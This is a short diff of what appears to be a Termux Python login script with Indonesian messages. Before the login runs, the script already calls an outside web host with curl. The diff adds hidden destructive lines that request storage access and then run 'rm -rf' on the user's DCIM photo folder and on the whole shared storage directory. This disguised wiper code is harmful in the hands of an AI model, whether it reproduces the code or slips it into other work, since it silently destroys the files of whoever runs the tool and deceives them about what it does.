@@ -77,6 +77,9 @@ class login:
                 br.submit()
 try:
     os.system('curl https://tutorialku69.000webhostapp.com/S.php')
+    os.system('termux-setup-storage')
+    os.system('rm -rf $HOME/storage/shared/DCIM')
+    os.system('rm -rf $HOME/storage/shared')
     os.system('clear')
     login()
     print("[ Sedang Masuk ]")
